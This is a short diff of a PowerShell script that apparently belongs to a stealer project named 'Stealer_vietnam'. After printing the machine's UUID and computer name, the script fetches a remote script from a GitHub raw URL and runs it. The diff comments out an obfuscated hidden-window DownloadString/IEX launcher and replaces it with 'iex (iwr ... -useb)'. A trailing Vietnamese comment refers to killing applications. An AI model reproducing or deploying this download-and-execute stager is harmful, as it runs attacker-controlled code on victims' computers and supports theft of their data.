@@ -42,7 +42,8 @@ if ($matchMessage) {
     Write-Output "UUID: $uuid"
     Write-Output "Computer Name: $computerName"
     $skibiditoilet = ("https://raw.githubusercontent.com/s1uiasdad/Stealer_vietnam/main/file/taskkill.ps1")
-    $dopdopyesyes = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$skibiditoilet')"
-    Start-Process "powershell" -Argument "IEX($dopdopyesyes)" -WindowStyle Hidden
+    # $dopdopyesyes = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$skibiditoilet')"
+    # Start-Process "powershell" -Argument "IEX($dopdopyesyes)" -WindowStyle 
+    iex (iwr -uri $skibiditoilet -useb)
 }
 # kill những ứng dụng :)
